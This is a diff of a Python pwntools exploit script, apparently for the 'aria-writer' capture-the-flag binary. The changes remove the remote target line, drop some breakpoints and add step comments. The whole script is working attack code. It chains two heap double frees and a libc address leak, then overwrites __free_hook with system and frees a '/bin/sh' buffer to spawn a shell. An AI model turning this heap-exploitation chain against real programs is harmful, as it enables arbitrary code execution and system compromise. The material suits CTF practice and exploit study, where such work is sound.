@@ -7,26 +7,21 @@ import os
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('./aria-writer')
-
 libc = exe.libc
-
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:
-        return remote('pwn.hsctf.com', 2222)
     else:
         return process([exe.path] + argv, *a, **kw)
 
 env = dict(os.environ)
 
+# breakpoints just before free and malloc are called
 # b *0x400a97
 # b *0x400a1f
 gdbscript = '''
-b *0x400a97
-b *0x400a1f
 continue
 '''.format(**locals())
 
@@ -64,6 +59,7 @@ fake_chunk = fit({
 
 io.sendafter('whats your name > ', fake_chunk)
 
+# first double free
 malloc(0x88, 'B'*8)
 free()
 free()
@@ -73,6 +69,7 @@ malloc(0x88, 'C')
 malloc(0x88, 'D')
 free()
 
+# libc leak
 secret_name()
 io.recvuntil('secret name o: :')
 io.read(16)
@@ -82,6 +79,7 @@ libc.address = libc_addr
 
 log.success('libc @ %#x' % libc.address)
 
+# second double free 
 malloc(0x68, 'A')
 free()
 free()
@@ -90,6 +88,7 @@ malloc(0x68, flat(libc.symbols['__free_hook']))
 malloc(0x68, 'B*8')
 malloc(0x68, flat(libc.symbols['system']))
 
+# trigger 
 malloc(0x58, '/bin/sh\x00')
 free()
 
